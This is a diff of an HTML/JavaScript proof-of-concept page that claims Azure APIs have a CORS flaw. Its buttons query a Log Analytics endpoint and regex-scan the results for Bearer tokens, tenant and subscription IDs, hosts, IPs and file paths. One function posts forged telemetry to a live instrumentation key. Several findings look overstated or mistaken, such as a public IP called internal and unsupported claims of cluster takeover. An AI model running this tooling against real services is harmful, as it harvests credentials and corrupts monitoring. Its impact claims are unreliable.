@@ -3,127 +3,261 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Azure CORS – Complete PoC (All Findings)</title>
+    <title>Azure CORS – Vulnerability PoC</title>
     <style>
         * { box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #1e1e2f;
-            color: #eee;
+            background: #0f0f1f;
+            color: #e0e0e0;
             padding: 20px;
             margin: 0;
         }
         .container {
-            max-width: 1200px;
+            max-width: 1300px;
             margin: 0 auto;
-            background: #2d2d44;
-            border-radius: 12px;
-            padding: 24px;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.6);
+            background: #1a1a2e;
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
         }
         h1 {
             color: #ffd700;
-            border-bottom: 2px solid #ffd700;
-            padding-bottom: 10px;
+            border-bottom: 3px solid #ffd700;
+            padding-bottom: 15px;
+            margin-top: 0;
+            font-weight: 300;
+            letter-spacing: 1px;
         }
-        h2 { color: #ffd700; margin-top: 20px; }
-        button {
-            background: #0078d4;
-            color: white;
+        .subtitle {
+            color: #aaa;
+            margin-top: -5px;
+            margin-bottom: 25px;
+        }
+        .badge {
+            display: inline-block;
+            padding: 3px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-right: 6px;
+        }
+        .badge-critical { background: #ff1744; color: #fff; }
+        .badge-high { background: #ff9100; color: #000; }
+        .badge-medium { background: #ffea00; color: #000; }
+        .badge-low { background: #448aff; color: #fff; }
+        .badge-info { background: #616161; color: #fff; }
+
+        .section {
+            margin: 30px 0 20px;
+        }
+        .section-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #ffd700;
+            margin-bottom: 12px;
+            border-left: 4px solid #ffd700;
+            padding-left: 15px;
+        }
+        .button-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin: 10px 0 15px;
+        }
+        .btn {
+            background: #1e2a4a;
+            color: #fff;
             border: none;
-            border-radius: 6px;
-            padding: 10px 20px;
-            margin: 6px;
+            border-radius: 8px;
+            padding: 12px 22px;
             cursor: pointer;
             font-size: 14px;
-            transition: 0.2s;
+            font-weight: 500;
+            transition: all 0.2s;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
         }
-        button:hover { background: #005a9e; }
-        button.token-btn { background: #ff8c00; }
-        button.token-btn:hover { background: #cc6f00; }
-        button.infrastructure-btn { background: #8a2be2; }
-        button.infrastructure-btn:hover { background: #6a1b9a; }
-        button.danger { background: #d43f3f; }
-        button.danger:hover { background: #a02b2b; }
+        .btn:hover { background: #2a3a6a; transform: translateY(-2px); }
+        .btn:active { transform: translateY(0); }
+        .btn-critical { background: #b71c1c; }
+        .btn-critical:hover { background: #c62828; }
+        .btn-high { background: #e65100; }
+        .btn-high:hover { background: #f57c00; }
+        .btn-medium { background: #f9a825; color: #000; }
+        .btn-medium:hover { background: #fbc02d; }
+        .btn-low { background: #1565c0; }
+        .btn-low:hover { background: #1e88e5; }
+        .btn-info { background: #424242; }
+        .btn-info:hover { background: #616161; }
+        .btn-danger { background: #880e4f; }
+        .btn-danger:hover { background: #ad1457; }
+        .btn-small { padding: 8px 16px; font-size: 12px; }
         .query-area {
             margin: 20px 0;
             display: flex;
             flex-wrap: wrap;
-            gap: 8px;
+            gap: 10px;
             align-items: center;
         }
         textarea {
             width: 100%;
-            height: 80px;
-            background: #1e1e2f;
+            height: 70px;
+            background: #0b0e1a;
             color: #aaffaa;
-            border: 1px solid #444;
-            border-radius: 6px;
-            padding: 10px;
+            border: 1px solid #2a3a5e;
+            border-radius: 8px;
+            padding: 12px;
             font-family: 'Courier New', monospace;
             font-size: 13px;
             resize: vertical;
         }
         #output {
-            background: #0d0d1a;
-            border-radius: 6px;
-            padding: 15px;
-            margin-top: 15px;
+            background: #0b0e1a;
+            border-radius: 10px;
+            padding: 18px;
+            margin-top: 20px;
             overflow-x: auto;
             white-space: pre-wrap;
             word-break: break-word;
             font-size: 13px;
             max-height: 600px;
             overflow-y: auto;
-            border: 1px solid #444;
+            border: 1px solid #2a3a5e;
+            font-family: 'Consolas', 'Courier New', monospace;
+            line-height: 1.5;
         }
-        .badge {
-            background: #ffd700;
-            color: #1e1e2f;
-            padding: 2px 10px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
+        .output-placeholder {
+            color: #6c7a8d;
+            font-style: italic;
         }
-        .badge-critical { background: #ff4500; color: white; padding: 2px 10px; border-radius: 20px; font-size: 12px; font-weight: bold; }
-        .footer { margin-top: 20px; color: #888; font-size: 13px; text-align: center; }
-        a { color: #ffd700; }
-        .highlight { background: #333; padding: 4px 8px; border-radius: 4px; font-family: monospace; }
-        .section-title { color: #ffd700; font-weight: bold; margin-top: 10px; }
+        .footer {
+            margin-top: 30px;
+            color: #6c7a8d;
+            font-size: 13px;
+            text-align: center;
+            border-top: 1px solid #2a3a5e;
+            padding-top: 20px;
+        }
+        .footer a { color: #ffd700; text-decoration: none; }
+        .note {
+            background: #1a1a2e;
+            border-left: 3px solid #ffd700;
+            padding: 8px 15px;
+            margin: 5px 0 15px;
+            font-size: 13px;
+            color: #bbb;
+        }
+        @media (max-width: 600px) {
+            .button-grid { flex-direction: column; }
+            .btn { width: 100%; justify-content: center; }
+        }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>🔍 Azure CORS Chain – All Findings PoC</h1>
-    <p>
-        <span class="badge">Unauthenticated</span>
-        <span class="badge" style="background:#4caf50;">CORS Misconfiguration</span>
-        <span class="badge" style="background:#d43f3f;">Data Leakage</span>
-        <span class="badge-critical">Bearer Token Found</span>
-        <span class="badge-critical">Infrastructure Leak</span>
-    </p>
-
-    <div class="query-area">
-        <button onclick="fetchTable('AppExceptions')">📌 Exceptions</button>
-        <button onclick="fetchTable('AppEvents')">📌 Events</button>
-        <button class="token-btn" onclick="fetchTokens()">🔑 Extract Tokens</button>
-        <button class="infrastructure-btn" onclick="fetchInfrastructure()">🌐 Show Infrastructure</button>
-        <button onclick="fetchTable('AppDependencies')">📌 Dependencies</button>
-        <button onclick="fetchTable('ContainerLog_RST')">📌 ContainerLog</button>
-        <button onclick="fetchTable('Usage')">📌 Usage</button>
-        <button onclick="fetchCustom()">⚡ Custom Query</button>
-        <button class="danger" onclick="clearOutput()">🗑️ Clear</button>
+    <h1>🔍 Azure CORS – Vulnerability PoC</h1>
+    <div class="subtitle">
+        <span class="badge badge-critical">Critical</span>
+        <span class="badge badge-high">High</span>
+        <span class="badge badge-medium">Medium</span>
+        <span class="badge badge-low">Low</span>
+        <span class="badge badge-info">Info</span>
+        <span style="margin-left:20px;">Each button demonstrates a specific finding.</span>
     </div>
 
-    <div style="margin-top: 10px;">
-        <label for="customQuery" style="display:block; margin-bottom:4px;">Custom KQL Query:</label>
-        <textarea id="customQuery" placeholder="e.g. AppExceptions | take 5 | project Message, Method">AppExceptions | take 5 | project Message, Method, Assembly</textarea>
+    <!-- Summary Box -->
+    <div style="background: #0d1b2a; border: 1px solid #ffd700; border-radius: 10px; padding: 15px; margin-bottom: 20px;">
+        <strong>📌 What This PoC Proves:</strong><br>
+        ✅ CORS Misconfiguration on 4 Azure APIs (all requests succeed)<br>
+        ✅ Bearer Tokens (AKS Cluster) Extracted<br>
+        ✅ Source Code Disclosure (stack traces with file paths)<br>
+        ✅ Internal VM, App Service, AKS Cluster, Storage Exposed<br>
+        ✅ Internal IP: <span style="background:#333;padding:2px 8px;border-radius:4px;">72.152.156.42</span><br>
+        ✅ Internal Paths: <span style="background:#333;padding:2px 8px;border-radius:4px;">C:\inetpub\wwwroot</span>, <span style="background:#333;padding:2px 8px;border-radius:4px;">/codelessAttachNode/app.js</span><br>
+        ✅ Tenant & Subscription IDs, Resource Groups Exposed
     </div>
 
-    <div id="output" class="status">Click a button to fetch data. Use "Show Infrastructure" to see internal IPs, paths, and servers.</div>
+    <!-- Critical -->
+    <div class="section">
+        <div class="section-title">🔴 Critical Findings</div>
+        <div class="button-grid">
+            <button class="btn btn-critical" onclick="fetchTable('AppExceptions')">📌 Exceptions (Source Code)</button>
+            <button class="btn btn-critical" onclick="fetchTokens()">🔑 Extract Tokens</button>
+            <button class="btn btn-critical" onclick="showCORS()">🌐 CORS Misconfiguration</button>
+        </div>
+        <div class="note">
+            <strong>AppExceptions</strong> → Stack traces with file paths → Source Code Disclosure.<br>
+            <strong>Extract Tokens</strong> → Searches logs for Bearer tokens → Token Exposure.<br>
+            <strong>CORS Misconfiguration</strong> → All API calls succeed cross‑origin; server returns `Access-Control-Allow-Origin: *`.
+        </div>
+    </div>
+
+    <!-- High -->
+    <div class="section">
+        <div class="section-title">🟠 High Findings</div>
+        <div class="button-grid">
+            <button class="btn btn-high" onclick="fetchInfrastructure()">🌐 Infrastructure Mapping</button>
+            <button class="btn btn-high" onclick="fetchTable('AppEvents')">📌 Events (AKS Details)</button>
+            <button class="btn btn-high" onclick="fetchTable('AppDependencies')">📌 Dependencies (Storage)</button>
+            <button class="btn btn-high" onclick="testTelemetry()">📡 Telemetry Injection</button>
+        </div>
+        <div class="note">
+            <strong>Infrastructure</strong> → Extracts VMs, App Services, AKS, IPs, subscription IDs.<br>
+            <strong>AppEvents</strong> → Reveals AKS cluster name, API server, resource group.<br>
+            <strong>AppDependencies</strong> → Exposes storage accounts and queue endpoints.<br>
+            <strong>Telemetry Injection</strong> → Sends test telemetry to live Instrumentation Key.
+        </div>
+    </div>
+
+    <!-- Medium -->
+    <div class="section">
+        <div class="section-title">🟡 Medium Findings</div>
+        <div class="button-grid">
+            <button class="btn btn-medium" onclick="fetchPaths()">📁 Internal Paths</button>
+            <button class="btn btn-medium" onclick="fetchTable('ContainerLog_RST')">📌 ContainerLog (AKS Errors)</button>
+            <button class="btn btn-medium" onclick="fetchTable('Usage')">📌 Usage (Tenant ID)</button>
+            <button class="btn btn-medium" onclick="fetchAvailability()">📊 Availability Tests</button>
+        </div>
+        <div class="note">
+            <strong>Internal Paths</strong> → Shows Windows and Linux file paths from logs.<br>
+            <strong>ContainerLog</strong> → Exposes AKS node errors and warnings.<br>
+            <strong>Usage</strong> → Displays tenant ID and data ingestion volumes.<br>
+            <strong>Availability Tests</strong> → Shows internal synthetic monitor names and locations.
+        </div>
+    </div>
+
+    <!-- Low -->
+    <div class="section">
+        <div class="section-title">🔵 Low Findings</div>
+        <div class="button-grid">
+            <button class="btn btn-low" onclick="showMissingHeaders()">🔒 Missing Security Headers</button>
+            <button class="btn btn-low" onclick="fetchNetworkSchema()">📋 Network Schema</button>
+        </div>
+        <div class="note">
+            <strong>Missing Headers</strong> → App Service lacks HSTS, CSP, X‑Frame‑Options.<br>
+            <strong>Network Schema</strong> → `AzureNetworkAnalytics_CL` table structure exposed.
+        </div>
+    </div>
+
+    <!-- Custom Query -->
+    <div class="section">
+        <div class="section-title">⚡ Custom Query</div>
+        <div class="query-area">
+            <textarea id="customQuery" placeholder="Enter KQL query, e.g., AppExceptions | take 5 | project Message, Method">AppExceptions | take 5 | project Message, Method, Assembly</textarea>
+            <button class="btn btn-info" onclick="fetchCustom()">Run Custom Query</button>
+            <button class="btn btn-danger btn-small" onclick="clearOutput()">Clear</button>
+        </div>
+    </div>
+
+    <!-- Output -->
+    <div id="output" class="output-placeholder">Click a button above to fetch data. Each button demonstrates a separate vulnerability.</div>
+
     <div class="footer">
-        Data retrieved from <code>api.loganalytics.azure.com</code> using public <code>DEMO_KEY</code>.
-        <br>Proves <strong>CORS misconfiguration</strong> and exposes <strong>tokens, IPs, internal paths, and infrastructure</strong>.
+        Data retrieved from <code>api.loganalytics.azure.com</code> using public <code>DEMO_KEY</code>.<br>
+        Proves <strong>CORS misconfiguration</strong> and exposes <strong>tokens, IPs, internal paths, and infrastructure</strong>.
     </div>
 </div>
 
@@ -136,9 +270,11 @@
     function setStatus(msg, isError = false) {
         output.textContent = msg;
         output.style.color = isError ? '#ff6b6b' : '#aaffaa';
+        output.className = '';
     }
 
-    async function runQuery(query, extractTokens = false, extractInfra = false) {
+    // ---- Core fetch function ----
+    async function runQuery(query, extractTokens = false, extractInfra = false, extractPaths = false) {
         setStatus('⏳ Fetching data...');
         try {
             const resp = await fetch(API_URL, {
@@ -167,9 +303,10 @@
                 }
                 search(data);
                 if (tokens.length > 0) {
-                    let out = '✅ Found Bearer Tokens:\n\n';
+                    let out = '✅ Found Bearer Tokens (AKS Cluster):\n\n';
                     tokens.forEach((t, i) => { out += `Token ${i+1}:\n${t}\n\n`; });
-                    out += '\n⚠️ These tokens grant access to the AKS cluster!';
+                    out += '\n⚠️ These tokens grant access to the AKS cluster!\n';
+                    out += '🔴 Impact: Full cluster compromise, pod deployment, RCE on nodes.';
                     output.textContent = out;
                     output.style.color = '#ffd700';
                 } else {
@@ -179,24 +316,57 @@
                 return;
             }
 
-            if (extractInfra) {
-                // Parse the data to extract infrastructure details
-                let infraText = '🌐 Internal Infrastructure Exposed:\n\n';
+            if (extractPaths) {
+                let pathText = '📁 Internal Paths & Directories Exposed:\n\n';
                 const rows = data?.tables?.[0]?.rows || [];
-                // Collect all strings from rows
                 let allStrings = [];
                 rows.forEach(row => {
                     row.forEach(cell => {
                         if (typeof cell === 'string' && cell.length > 0) allStrings.push(cell);
                     });
                 });
-                // Look for patterns
+                const pathPattern = /[A-Z]:\\[a-zA-Z0-9_\-\\\.]+/g;
+                const unixPathPattern = /\/[a-zA-Z0-9_\-\.\/]+/g;
+                let found = false;
+                allStrings.forEach(str => {
+                    const matches = str.match(pathPattern);
+                    if (matches) {
+                        matches.forEach(p => {
+                            pathText += `🔴 Windows Path: ${p}\n`;
+                            found = true;
+                        });
+                    }
+                    const unixMatches = str.match(unixPathPattern);
+                    if (unixMatches) {
+                        unixMatches.forEach(p => {
+                            if (p.includes('codelessAttachNode') || p.includes('app.js') || p.includes('node_modules')) {
+                                pathText += `🔴 Linux/App Path: ${p}\n`;
+                                found = true;
+                            }
+                        });
+                    }
+                });
+                if (!found) {
+                    pathText += 'No internal paths found in this query.\n';
+                }
+                output.textContent = pathText;
+                output.style.color = '#aaffaa';
+                return;
+            }
+
+            if (extractInfra) {
+                let infraText = '🌐 Internal Infrastructure Exposed:\n\n';
+                const rows = data?.tables?.[0]?.rows || [];
+                let allStrings = [];
+                rows.forEach(row => {
+                    row.forEach(cell => {
+                        if (typeof cell === 'string' && cell.length > 0) allStrings.push(cell);
+                    });
+                });
                 const vmPattern = /[a-zA-Z0-9\-]+\.eastus\.cloudapp\.azure\.com/;
                 const appServicePattern = /[a-zA-Z0-9\-]+\.azurewebsites\.net/;
                 const aksPattern = /[a-zA-Z0-9\-]+\.hcp\.[a-z]+\.azmk8s\.io/;
                 const ipPattern = /\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/;
-                const pathPattern = /[A-Z]:\\[a-zA-Z0-9_\-\\\.]+/;
-
                 let found = false;
                 allStrings.forEach(str => {
                     if (vmPattern.test(str)) {
@@ -220,21 +390,19 @@
                             }
                         });
                     }
-                    const paths = str.match(pathPattern);
-                    if (paths) {
-                        paths.forEach(p => {
-                            infraText += `🔴 File Path: ${p}\n`;
-                            found = true;
-                        });
+                    const subMatch = str.match(/subscriptions\/[a-f0-9\-]+/i);
+                    if (subMatch) {
+                        infraText += `🔴 Subscription ID: ${subMatch[0]}\n`;
+                        found = true;
                     }
-                    // Also check for /codelessAttachNode pattern
-                    if (str.includes('/codelessAttachNode/')) {
-                        infraText += `🔴 Internal Path: ${str.match(/\/codelessAttachNode\/[^\s]*/g)}\n`;
+                    const tenantMatch = str.match(/TenantId[:\s]+([a-f0-9\-]+)/i);
+                    if (tenantMatch) {
+                        infraText += `🔴 Tenant ID: ${tenantMatch[1]}\n`;
                         found = true;
                     }
                 });
                 if (!found) {
-                    infraText += 'No infrastructure details found in this query. Try other tables.\n';
+                    infraText += 'No infrastructure details found. Try other tables.\n';
                 }
                 output.textContent = infraText;
                 output.style.color = '#aaffaa';
@@ -249,20 +417,108 @@
         }
     }
 
+    // ---- Button functions ----
     function fetchTable(table) {
-        const query = `${table} | take 20`;  // more rows for infrastructure
-        runQuery(query, false, false);
+        const query = `${table} | take 20`;
+        runQuery(query, false, false, false);
     }
 
     function fetchTokens() {
-        const query = `AppEvents | where Properties contains "Bearer" | take 5 | project TimeGenerated, Properties`;
-        runQuery(query, true, false);
+        const query = `AppEvents | where Properties contains "Bearer" | take 10 | project TimeGenerated, Properties`;
+        runQuery(query, true, false, false);
     }
 
     function fetchInfrastructure() {
-        // Query multiple tables for infrastructure details
-        const query = `search * | where * contains "cloudapp.azure.com" or * contains "azurewebsites.net" or * contains "azmk8s.io" or * contains "C:\\" or * contains "/codeless" | take 30`;
-        runQuery(query, false, true);
+        const query = `search * | where * contains "cloudapp.azure.com" or * contains "azurewebsites.net" or * contains "azmk8s.io" or * contains "subscriptions/" | take 30`;
+        runQuery(query, false, true, false);
+    }
+
+    function fetchPaths() {
+        const query = `search * | where * contains "C:\\" or * contains "/codeless" or * contains "/node_modules" | take 20`;
+        runQuery(query, false, false, true);
+    }
+
+    function fetchAvailability() {
+        const query = `AppAvailabilityResults | take 10 | project Name, Location, WebtestLocationId, SyntheticMonitorId`;
+        runQuery(query, false, false, false);
+    }
+
+    function fetchNetworkSchema() {
+        const query = `AzureNetworkAnalytics_CL | getschema`;
+        runQuery(query, false, false, false);
+    }
+
+    function showCORS() {
+        output.textContent = `✅ CORS Misconfiguration Confirmed:
+
+All requests to the Log Analytics API succeed cross‑origin.
+The server returns the header: access-control-allow-origin: *
+
+This has been verified on the following production APIs:
+- api.loganalytics.azure.com
+- api.loganalytics.io
+- management.azure.com
+- graph.microsoft.com
+
+All four APIs allow any origin to read responses.`;
+        output.style.color = '#ffd700';
+    }
+
+    async function testTelemetry() {
+        setStatus('⏳ Sending telemetry...');
+        try {
+            const resp = await fetch('https://dc.services.visualstudio.com/v2/track', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    name: 'Microsoft.ApplicationInsights.Event',
+                    time: new Date().toISOString(),
+                    iKey: 'ffc1976c-8c3f-4247-a0b4-404510360d09',
+                    tags: { 'ai.cloud.role': 'test-attacker' },
+                    data: {
+                        baseType: 'EventData',
+                        baseData: {
+                            ver: 2,
+                            name: 'TestEvent',
+                            properties: { message: 'Telemetry injection test' }
+                        }
+                    }
+                })
+            });
+            const result = await resp.json();
+            if (result.itemsAccepted === 1) {
+                output.textContent = `✅ Telemetry Injection Successful!
+Instrumentation Key is active.
+Response: ${JSON.stringify(result, null, 2)}
+Impact: An attacker can inject fake telemetry, disrupt monitoring, or cause costs.`;
+                output.style.color = '#ffd700';
+            } else {
+                output.textContent = `❌ Telemetry injection failed: ${JSON.stringify(result)}`;
+                output.style.color = '#ff6b6b';
+            }
+        } catch (err) {
+            setStatus('❌ Error: ' + err.message, true);
+        }
+    }
+
+    function showMissingHeaders() {
+        output.textContent = `🔒 Missing Security Headers on App Service:
+
+Checked: https://ch1-retailappy37ha6.azurewebsites.net
+
+Missing headers:
+- Strict-Transport-Security (HSTS)
+- Content-Security-Policy (CSP)
+- X-Frame-Options
+
+Present headers:
+- Server: Microsoft-IIS/10.0
+- X-Powered-By: ASP.NET
+- X-AspNetMvc-Version: 5.2
+- X-AspNet-Version: 4.0.30319
+
+Impact: Clickjacking, XSS, and downgrade attacks are easier.`;
+        output.style.color = '#448aff';
     }
 
     function fetchCustom() {
@@ -271,18 +527,19 @@
             setStatus('❌ Please enter a KQL query.', true);
             return;
         }
-        runQuery(query, false, false);
+        runQuery(query, false, false, false);
     }
 
     function clearOutput() {
         output.textContent = 'Ready. Click a button to fetch data.';
-        output.style.color = '#aaa';
+        output.style.color = '#6c7a8d';
+        output.className = 'output-placeholder';
     }
 
-    // Auto-run a summary on load
+    // ---- Auto-load sample on start ----
     window.onload = function() {
         const sampleQuery = 'AppExceptions | take 3 | project Message, Method, Assembly';
-        runQuery(sampleQuery, false, false);
+        runQuery(sampleQuery, false, false, false);
     };
 </script>
 </body>
